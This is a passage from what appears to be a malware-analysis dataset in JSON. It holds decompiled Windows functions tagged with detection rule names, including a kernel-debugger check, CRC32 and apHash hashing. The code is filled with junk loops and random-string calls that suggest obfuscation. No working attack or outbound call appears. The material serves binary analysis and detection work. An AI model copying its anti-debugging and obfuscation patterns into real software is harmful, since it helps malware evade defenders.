fcn.00405164(&var_50h, &var_68h);\n                        var_38h = *ppcVar3;\n                        var_34h = ppcVar3[1];\n                    }\n                }\n            }\n            else if (uVar5 == 6) {\n                if (arg_14h_00 == 0) goto code_r0x0048e821;\n                var_1dh._0_1_ = '\\x01';\n            }\n            else if (uVar5 == 7) {\n                if (arg_14h_00 == 0) goto code_r0x0048e821;\n                var_1eh = '\\x01';\n            }\n            else {\n                if (uVar5 != 8) {\n                    if (**0x574458 != '\\0') {\n                        *0x574458 = *0x574458 + 1;\n                    }\n                    if (0x1f < uVar5) goto code_r0x0048e821;\n                    unique0x00007a00 = *(arg_10h * 8 + 0x554f58);\n                    var_3ch = *(arg_10h * 8 + 0x554f5c);\n                    var_ch = var_3ch;\n                    fcn.00402d47(&var_11h + 1);\n                    stack0xffffffe0 = NULL;\n                    var_18h = NULL;\n                    fcn.00402eeb(&var_8h);\n                    var_8h = stack0xffffffe0;\n                    var_4h = var_18h;\n                    if (pcVar6 != NULL) {\n                        fcn.00403d55(0x20);\n                        ppcVar3 = fcn.004053b7(&var_28h, &var_30h);\n                        var_8h = *ppcVar3;\n                        var_4h = ppcVar3[1];\n                    }\n                    if (var_38h != NULL) {\n                        stack0xffffffe0 = var_38h;\n                        var_18h = var_34h;\n                        fcn.00403d55(0x20);\n                        ppcVar3 = fcn.004053b7(&var_28h, &var_8h);\n                        var_8h = *ppcVar3;\n                        var_4h = ppcVar3[1];\n                    }\n                    if ((uVar5 & 0x10) != 0) {\n                        if (arg_14h_00 != 0) goto code_r0x0048e821;\n                        if (var_3ch < 1) {\n                            if (**0x574458 != '\\0') {\n                                uVar4 = fcn.00403a80(&var_28h);\n                                fcn.00406a05(uVar4);\n                                goto code_r0x0048e80b;\n                            }\n                        }\n                        else {\n                            stack0xffffffec = 0x555750;\n                            var_ch = 0x2;\n                            fcn.00402d47(&var_11h + 1);\n                            fcn.004053b7(&var_11h + 1, &var_8h);\n                            var_8h = stack0xffffffec;\n                            var_4h = var_ch;\n                            if (**0x574458 == '\\0') {\n                                fcn.004017df(1);\n                                fcn.004053b7(&var_11h + 1, &var_8h);\n                                var_8h = stack0xffffffec;\n                                var_4h = var_ch;\n                            }\n                            else {\n                                fcn.00403a80(&var_28h);\n                                ppcVar3 = fcn.004053b7(&var_50h, &var_8h);\n                                var_8h = *ppcVar3;\n                                var_4h = ppcVar3[1];\n                            }\ncode_r0x0048e80b:\n                            cVar1 = **0x574458;\n                            if (cVar1 != '\\0') {\n                                *0x574458 = *0x574458 + 1;\n                                if (cVar1 != '@') goto code_r0x0048e821;\n                                goto code_r0x0048e856;\n                            }\n                        }\n                        if (var_4h < '\\x02') {\n                            if (var_8h == NULL) {\n                                fcn.00402eb9(1);\n                            }\n                            else {\n                                fcn.00405713(0x555dd8);\n                            }\n                        }\n                    }\ncode_r0x0048e856:\n                    if ((~(*0x574460 >> 1) & 1) == 0) {\n                        if ((uVar5 & 0xc) == 0xc) {\n                            uVar4 = fcn.004051a0(&var_28h);\n                            fcn.00406a05(uVar4);\n                        }\n                    }\n                    else if ((uVar5 & 0xc) == 0xc) {\n                        if (arg_14h_00 != 0) {\ncode_r0x0048e821:\n                            arg_8h[1] = NULL;\n                            *arg_8h = NULL;\n                            *(arg_8h + 1) = 2;\n                            return arg_8h;\n                        }\n                        fcn.004051a0(&var_28h);\n                        ppcVar3 = fcn.004053b7(&var_50h, &var_8h);\n                        var_8h = *ppcVar3;\n                        var_4h = ppcVar3[1];\n                    }\n                    if ((uVar5 & 2) != 0) {\n                        stack0xffffffec = \"volatile \";\n                        var_ch = 0x9;\n                        fcn.00402d47(&var_11h + 1);\n                        fcn.004053b7(&var_11h + 1, &var_8h);\n                        var_8h = stack0xffffffec;\n                        var_4h = var_ch;\n                    }\n                    if ((uVar5 & 1) != 0) {\n                        stack0xffffffec = \"const \";\n                        var_ch = 0x6;\n                        fcn.00402d47(&var_11h + 1);\n                        fcn.004053b7(&var_11h + 1, &var_8h);\n                        var_8h = stack0xffffffec;\n                        var_4h = var_ch;\n                    }\n                    if (var_1dh != '\\0') {\n                        stack0xffffffe0 = var_8h;\n                        var_18h = var_4h;\n                        stack0xffffffec = 0x555bbc;\n                        var_ch = 0x2;\n                        fcn.00405d71(&var_11h + 1);\n                        var_8h = stack0xffffffe0;\n                        var_4h = var_18h;\n                    }\n                    if (var_1eh != '\\0') {\n                        stack0xffffffe0 = var_8h;\n                        var_18h = var_4h;\n                        stack0xffffffec = 0x555bc0;\n                        var_ch = 0x3;\n                        fcn.00405d71(&var_11h + 1);\n                        var_8h = stack0xffffffe0;\n                        var_4h = var_18h;\n                    }\n                    pcVar2 = var_8h;\n                    pcVar6 = var_4h;\n                    if (arg_14h_00 != 0) goto code_r0x0048ea10;\n                    if (*arg_ch == NULL) {\n                        arg_ch = arg_14h;\n                        if (*arg_14h == NULL) goto code_r0x0048ea10;\ncode_r0x0048e9f9:\n                        uVar4 = fcn.00402eb4(&var_28h, 0x20, arg_ch);\n                    }\n                    else {\n                        pcVar6 = arg_ch[1];\n                        if (((pcVar6 & 0x100) != 0) || (*arg_14h == NULL)) {\n                            pcVar2 = *arg_ch;\n                            if ((pcVar6 & 0x800) != 0) goto code_r0x0048ea10;\n                            goto code_r0x0048e9f9;\n                        }\n                        fcn.00402eb4(&var_28h, 0x20, arg_14h);\n                        fcn.0040330f(&var_50h, 0x20);\n                        uVar4 = fcn.004053b7(&var_80h, arg_ch);\n                    }\n                    fcn.00402eeb(uVar4);\n                    pcVar2 = var_8h;\n                    pcVar6 = var_4h;\ncode_r0x0048ea10:\n                    var_4h = pcVar6;\n                    var_8h = pcVar2;\n                    pcVar6 = var_4h | 0x100;\n                    if (var_11h != '\\0') {\n                        pcVar6 = var_4h | 0x2100;\n                    }\n                    *arg_8h = var_8h;\n                    arg_8h[1] = pcVar6;\n                    return arg_8h;\n                }\n                if ((~(*0x574460 >> 1) & 1) != 0) {\n                    uVar7 = fcn.00402d29(0xc);\n                    if (pcVar6 == NULL) {\n                        arg_8h_00 = &var_60h;\n                        _var_60h = uVar7;\n                        uVar7 = stack0xffffffec;\n                        goto code_r0x0048e62a;\n                    }\n                    var_18h = var_2ch;\n                    unique0x10000deb = pcVar6;\n                    _var_58h = uVar7;\n                    fcn.00403d55(0x20);\n                    ppcVar3 = fcn.00405164(&var_80h, &var_58h);\n                    var_2ch = ppcVar3[1];\n                    pcVar6 = *ppcVar3;\n                    var_30h = *ppcVar3;\n                }\n            }\n            *0x574458 = *0x574458 + 1;\n            if (**0x574458 == '$') {\n                fcn.004031fc(&var_48h, &arg_10h, &var_11h, arg_14h_00);\n                if (var_48h != NULL) goto code_r0x0048ea31;\n            }\n            uVar5 = **0x574458 - (((**0x574458 < 'A') - 1 & 0x2b) + 0x16);\n        } while( true );\n    }\n    *arg_8h = stack0xffffffe0;\n    goto code_r0x0048e46c;\ncode_r0x0048ea31:\n    *arg_8h = var_48h;\n    var_18h = var_44h;\ncode_r0x0048e46c:\n    arg_8h[1] = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 3608
    },
    "004013de": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004013de(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack228;\n    int32_t iStack224;\n    int32_t iStack220;\n    uchar auStack216 [24];\n    uchar auStack192 [24];\n    int32_t iStack168;\n    uchar auStack164 [24];\n    uchar auStack140 [24];\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffef8;\n    uStack28 = 0x450280;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40e8da20;\n    uStack48 = 0;\n    uStack52 = 0x40d26000;\n    uStack56 = 0;\n    uStack60 = 0x40d7ad80;\n    uStack64 = 0;\n    uStack68 = 0x40e70b40;\n    uStack72 = 0;\n    uStack76 = 0x1427;\n    uStack24 = 3;\n    fcn.00401e79(\"kcmozuegbvoflgdardfuxqgfpzjlqnhjftclaellerefqdzjsxcmiawhujwwibuikydswkuuidjg\");\n    uStack104 = 0xe5e;\n    uStack108 = 0x40d670c0;\n    uStack112 = 0;\n    uStack116 = 0xba8;\n    uStack24 = 4;\n    fcn.00401e79(\"kcmozuegbvoflgdardfuxqgfpzjlqnhjftclaellerefqdzjsxcmiawhujwwibuikydswkuuidjg\");\n    uStack24 = 6;\n    fcn.00401e79(\"kcmozuegbvoflgdardfuxqgfpzjlqnhjftclaellerefqdzjsxcmiawhujwwibuikydswkuuidjg\");\n    uVar1 = fcn.00405b37(auStack164, auStack140);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack168 = 0x26; 0 < iStack168; iStack168 = iStack168 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"kcmozuegbvoflgdardfuxqgfpzjlqnhjftclaellerefqdzjsxcmiawhujwwibuikydswkuuidjg\");\n    uStack24 = 5;\n    fcn.00401e79(\"kcmozuegbvoflgdardfuxqgfpzjlqnhjftclaellerefqdzjsxcmiawhujwwibuikydswkuuidjg\");\n    uVar1 = fcn.004042dc(auStack216, auStack192);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack220 = 0xf; 0 < iStack220; iStack220 = iStack220 + -1) {\n        }\n    }\n    for (iStack224 = 0x5e; 0 < iStack224; iStack224 = iStack224 + -1) {\n    }\n    for (iStack228 = 0x5b; 0 < iStack228; iStack228 = iStack228 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xd557;\n}\n",
        "token_count": 1011
    },
    "0040141f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.0040141f(int32_t arg_8h)\n\n{\n    uint arg_14h;\n    uint arg_ch;\n    uint8_t uVar1;\n    uint arg_10h;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_14h = *(arg_8h + 0x10);\n    arg_10h = fcn.00401e06();\n    arg_ch = *(in_ECX + 0x10);\n    arg_8h_00 = fcn.00401e06();\n    uVar1 = fcn.00401e88(arg_8h_00, arg_ch, arg_10h, arg_14h);\n    return uVar1 & 1;\n}\n",
        "token_count": 203
    },
    "004d22ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.004d22ac(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        return -1;\n    }\n    arg_8h_00 = fcn.00406005(arg_8h);\n    if (arg_8h[2] < 0) {\n        arg_8h[2] = 0;\n    }\n    iVar5 = fcn.00404624(arg_8h_00, 0, 0, 1);\n    arg_10h = iVar5 >> 0x20;\n    if ((iVar5 < 0x100000000) && (iVar5 < 0)) {\ncode_r0x004d23d7:\n        iVar7 = -1;\n    }\n    else {\n        if ((arg_8h[3] & 0xc0U) == 0) {\n            return iVar5 - arg_8h[2];\n        }\n        iVar3 = arg_8h_00 >> 6;\n        iVar4 = (arg_8h_00 & 0x3f) * 0x38;\n        uVar1 = *(iVar4 + 0x29 + *(iVar3 * 4 + 0x575220));\n        var_4h = var_4h & 0xffffff00 | uVar1;\n        iVar7 = *arg_8h - arg_8h[1];\n        if ((arg_8h[3] & 3U) == 0) {\n            if ((arg_8h[3] >> 2 & 1) == 0) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                goto code_r0x004d23d7;\n            }\n        }\n        else {\n            if ((uVar1 == 1) && ((*(iVar4 + 0x2d + *(iVar3 * 4 + 0x575220)) & 2) != 0)) {\n                iVar5 = fcn.004d278b(arg_8h, iVar5, arg_10h);\n                return iVar5;\n            }\n            if (*(iVar4 + 0x28 + *(iVar3 * 4 + 0x575220)) < '\\0') {\n                iVar6 = fcn.004d2986(arg_8h[1], *arg_8h, var_4h);\n                iVar7 = iVar6 + iVar7;\n            }\n        }\n        if (iVar5 != 0) {\n            if ((arg_8h[3] & 1U) == 0) {\n                if (uVar1 == 1) {\n                    iVar7 = fcn.00406168(iVar7, 2, 0);\n                }\n                iVar7 = iVar7 + iVar5;\n            }\n            else {\n                iVar7 = fcn.004d2564(arg_8h, iVar5, arg_10h, iVar7, iVar7 >> 0x20);\n            }\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 804
    },
    "0040148d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040148d(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    return *arg_8h == *arg_ch;\n}\n",
        "token_count": 41
    },
    "004014f6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.004014f6(void)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack216;\n    uchar auStack212 [24];\n    uchar auStack188 [24];\n    int32_t iStack164;\n    uint uStack136;\n    uint uStack132;\n    uint uStack100;\n    uchar uStack45;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451480;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1f;\n    uStack45 = 1;\n    fcn.00401e79(\"hinzmrgpxedxsqkanxyuhpbgemzcqgqzqatcorecqbcpxdoksxvoaerxizxyhxgbvfbulmzaurdommasvsfnbiyzvonvym\");\n    uStack24 = 0;\n    fcn.00401e79(\"ohhlavvqse\");\n    uStack100 = 0xdc4;\n    uStack24 = 1;\n    fcn.00401e79(\"tosiavqrmuhgitgbjwp\");\n    uStack132 = 0x40c98800;\n    uStack136 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"zjdvnqcvklj\");\n    for (iStack164 = 0x11; 0 < iStack164; iStack164 = iStack164 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"ohhlavvqse\");\n    uStack24 = 4;\n    fcn.00401e79(\"ohhlavvqse\");\n    uVar1 = fcn.004042dc(auStack212, auStack188);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack216 = 0x12; 0 < iStack216; iStack216 = iStack216 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 599
    },
    "0040158c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040158c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack256;\n    uchar auStack252 [24];\n    uchar auStack228 [24];\n    int32_t iStack204;\n    uchar auStack200 [24];\n    uchar auStack176 [24];\n    int32_t iStack152;\n    int32_t iStack148;\n    ulong uStack144;\n    uchar uStack129;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffee8;\n    uStack28 = 0x44ffa0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40c46680;\n    uStack48 = 0;\n    uStack52 = 0x40ece7a0;\n    uStack56 = 0;\n    uStack60 = 0x1db4;\n    uStack24 = 0;\n    fcn.00401e79(\"xvqqhwcoaeusxgesufodubhodohwjopgwkcxwerbwhzkitohbiuu\");\n    uStack92 = 0x40ddedc0;\n    uStack96 = 0;\n    uStack100 = 0x40f41e20;\n    uStack104 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"vtfxjrfihfetvcpjnwrwsqxvjhdxnpivcgcqqvfkroinobeutjstqsglilywk\");\n    uStack129 = 1;\n    uStack144 = *0x546948;\n    for (iStack148 = 8; 0 < iStack148; iStack148 = iStack148 + -1) {\n    }\n    for (iStack152 = 0x54; 0 < iStack152; iStack152 = iStack152 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"xvqqhwcoaeusxgesufodubhodohwjopgwkcxwerbwhzkitohbiuu\");\n    uStack24 = 4;\n    fcn.00401e79(\"xvqqhwcoaeusxgesufodubhodohwjopgwkcxwerbwhzkitohbiuu\");\n    uVar1 = fcn.00405b37(auStack200, auStack176);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack204 = 0x61; 0 < iStack204; iStack204 = iStack204 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"vtfxjrfihfetvcpjnwrwsqxvjhdxnpivcgcqqvfkroinobeutjstqsglilywk\");\n    uStack24 = 3;\n    fcn.00401e79(\"vtfxjrfihfetvcpjnwrwsqxvjhdxnpivcgcqqvfkroinobeutjstqsglilywk\");\n    uVar1 = fcn.004042dc(auStack252, auStack228);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack256 = 0x32; 0 < iStack256; iStack256 = iStack256 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 954
    },
    "004015be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004015be(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t *var_4h;\n    \n    if (*0x57504c == 0) {\n        if (arg_8h + 1U < 0x101) {\n            return *(*0x571e78 + arg_8h * 2) & 1;\n        }\n    }\n    else {\n        arg_8h_00 = fcn.004043ef();\n        var_4h = *(arg_8h_00 + 0x4c);\n        fcn.0040449e(arg_8h_00, &var_4h);\n        if (arg_8h + 1U < 0x101) {\n            return *(*var_4h + arg_8h * 2) & 1;\n        }\n        if (1 < var_4h[1]) {\n            uVar1 = fcn.0040433b(arg_8h, 1, 0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "0040163b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040163b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 0x34; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02(&arg_8h, &stack0x00000020, &stack0x00000038, &stack0x00000050, &stack0x00000070, iVar1, 0x7a1);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return 0;\n}\n",
        "token_count": 153
    },
    "00401645": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401645(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450b40;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"oqdjbnhhdtgpezxjbotrcowsgbehmwqksllcegcxnqqrvppikazjtosoxmga\");\n    uStack24 = 1;\n    fcn.00401e79(\"ltbtkltstscrhlfmmhqxyvqpwvgdocvtqozxizjnsbzwfycmlxlcinwzcfgnkkugpxvfytrtqvfcybnucapka\");\n    for (iStack140 = 0x50; 0 < iStack140; iStack140 = iStack140 + -1) {\n    }\n    for (iStack144 = 0x50; 0 < iStack144; iStack144 = iStack144 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 341
    },
    "0040165e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.0040165e(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack160;\n    uchar auStack156 [24];\n    uchar auStack132 [24];\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    uint uStack76;\n    uint uStack72;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff48;\n    uStack28 = 0x44fec0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1436;\n    uStack24 = 0;\n    fcn.00401e79(\"qgpmrognsziqphhlrzryamedigzggftnsxarwwiwjsfnqagajembijdmqaqeojnecbskzvqcopirajspozppznpfdppugehuxbfd\")\n    ;\n    uStack72 = 0x6fc;\n    uStack76 = 0x181;\n    uStack88 = *0x546838;\n    uStack92 = 0xc2e;\n    uStack96 = 0xb6;\n    uStack100 = 0x1ce2;\n    for (iStack104 = 0x4a; 0 < iStack104; iStack104 = iStack104 + -1) {\n    }\n    for (iStack108 = 0x22; 0 < iStack108; iStack108 = iStack108 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"qgpmrognsziqphhlrzryamedigzggftnsxarwwiwjsfnqagajembijdmqaqeojnecbskzvqcopirajspozppznpfdppugehuxbfd\")\n    ;\n    uStack24 = 2;\n    fcn.00401e79(\"qgpmrognsziqphhlrzryamedigzggftnsxarwwiwjsfnqagajembijdmqaqeojnecbskzvqcopirajspozppznpfdppugehuxbfd\")\n    ;\n    uVar1 = fcn.00405b37(auStack156, auStack132);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack160 = 0x19; 0 < iStack160; iStack160 = iStack160 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546854;\n}\n",
        "token_count": 698
    },
    "004016b3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.004016b3(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack336;\n    int32_t iStack332;\n    uchar auStack328 [24];\n    uchar auStack304 [24];\n    int32_t iStack280;\n    uchar auStack276 [24];\n    uchar auStack252 [24];\n    int32_t iStack228;\n    uchar auStack224 [24];\n    uchar auStack200 [24];\n    uint uStack176;\n    uint uStack172;\n    uchar uStack166;\n    uchar uStack165;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar uStack77;\n    ulong uStack72;\n    uint8_t uStack58;\n    uint8_t uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uchar uStack39;\n    uint8_t uStack38;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffe98;\n    uStack48 = CONCAT44(noname_7, arg_20h);\n    uStack56 = CONCAT44(noname_5, arg_18h);\n    uStack72 = CONCAT44(noname_1, arg_8h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451700;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_34h & 1;\n    uStack38 = arg_30h & 1;\n    uVar2 = CONCAT11(arg_2ch, arg_10h) & 0x1ff;\n    uStack39 = uVar2 >> 8;\n    uStack57 = arg_14h & 1;\n    uStack58 = uVar2 & 1;\n    uStack77 = 0;\n    fcn.00401e79(\"cibodqyxwcwyjbnyihibjxoeueuqkacizrcwyvm\");\n    uStack24 = 0;\n    fcn.00401e79(\"ucqzmvayfghhgkobsogswpbybzienvuqpwsgdqpphgyvjyoexoeuoktpvvqbqh\");\n    uStack132 = 0x40e38980;\n    uStack136 = 0;\n    uStack140 = 0xcd4;\n    uStack24 = 1;\n    fcn.00401e79(\"qbjavroflfgpjhgqxcyhsqtzubmvjeghbrgmjvvlnkmmvcnbmycomxehxnsjzplqkhujeiecfwhidikgujgxkidhq\");\n    uStack165 = 1;\n    uStack166 = 0;\n    uStack172 = 0x40f1b550;\n    uStack176 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"ucqzmvayfghhgkobsogswpbybzienvuqpwsgdqpphgyvjyoexoeuoktpvvqbqh\");\n    uStack24 = 5;\n    fcn.00401e79(\"ucqzmvayfghhgkobsogswpbybzienvuqpwsgdqpphgyvjyoexoeuoktpvvqbqh\");\n    uVar1 = fcn.00405b37(auStack224, auStack200);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack228 = 0x12; 0 < iStack228; iStack228 = iStack228 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"qbjavroflfgpjhgqxcyhsqtzubmvjeghbrgmjvvlnkmmvcnbmycomxehxnsjzplqkhujeiecfwhidikgujgxkidhq\");\n    uStack24 = 4;\n    fcn.00401e79(\"qbjavroflfgpjhgqxcyhsqtzubmvjeghbrgmjvvlnkmmvcnbmycomxehxnsjzplqkhujeiecfwhidikgujgxkidhq\");\n    uVar1 = fcn.00405b37(auStack276, auStack252);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack280 = 4; 0 < iStack280; iStack280 = iStack280 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"ucqzmvayfghhgkobsogswpbybzienvuqpwsgdqpphgyvjyoexoeuoktpvvqbqh\");\n    uStack24 = 3;\n    fcn.00401e79(\"ucqzmvayfghhgkobsogswpbybzienvuqpwsgdqpphgyvjyoexoeuoktpvvqbqh\");\n    uVar1 = fcn.00405b37(auStack328, auStack304);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack332 = 